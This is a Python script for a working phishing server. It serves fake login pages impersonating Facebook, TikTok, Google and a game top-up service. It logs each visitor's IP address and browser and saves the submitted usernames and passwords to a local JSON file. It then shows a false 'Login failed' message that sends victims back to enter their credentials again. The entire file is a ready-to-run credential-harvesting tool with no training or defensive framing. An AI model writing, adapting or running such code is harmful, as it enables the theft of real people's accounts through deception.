#!/usr/bin/env python3
import os
import sys
import json
import time
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import urllib.parse

LOG_FILE = os.path.join(os.path.dirname(__file__), "phishing_logs.json")
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5001
SERVICE_SUB = sys.argv[2] if len(sys.argv) > 2 else "facebook.com"
SERVICE_NAME = sys.argv[3] if len(sys.argv) > 3 else "Facebook"

TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "templates")

def get_template(service_name):
    mapping = {
        "Facebook": "facebook.html",
        "Topup Game": "topup.html",
        "TikTok": "tiktok.html",
        "Google": "google.html"
    }
    filename = mapping.get(service_name, "facebook.html")
    path = os.path.join(TEMPLATES_DIR, filename)
    if os.path.exists(path):
        with open(path, "r") as f:
            return f.read()
    else:
        # fallback template
        return f"""<!DOCTYPE html>
<html>
<head><title>{service_name} Login</title>
<style>
body {{ font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }}
.box {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }}
h2 {{ text-align: center; }}
input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }}
</style>
</head>
<body>
<div class="box">
<h2>{service_name} Login</h2>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Email / Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>"""

def log_data(ip, user_agent, data, service):
    entry = {
        "time": datetime.now().isoformat(),
        "ip": ip,
        "user_agent": user_agent,
        "data": data,
        "service": service
    }
    try:
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
    except:
        logs = []
    logs.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/favicon.ico":
            self.send_response(404)
            self.end_headers()
            return

        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "unknown")
        log_data(ip, ua, {"action": "visit", "path": self.path}, SERVICE_NAME)

        html = get_template(SERVICE_NAME)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "unknown")
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        parsed = urllib.parse.parse_qs(post_data)
        creds = {k: v[0] for k, v in parsed.items()}

        log_data(ip, ua, creds, SERVICE_NAME)

        # Redirect ke halaman sukses/error
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Login</title>
        <style>
        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
        .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h2 { color: #e74c3c; }
        </style>
        </head>
        <body>
        <div class="box">
        <h2>Login failed</h2>
        <p>Invalid credentials. Please try again.</p>
        <a href="/">Back to Login</a>
        </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), PhishHandler)
    print(f"[+] Phishing server running on port {PORT}")
    server.serve_forever()
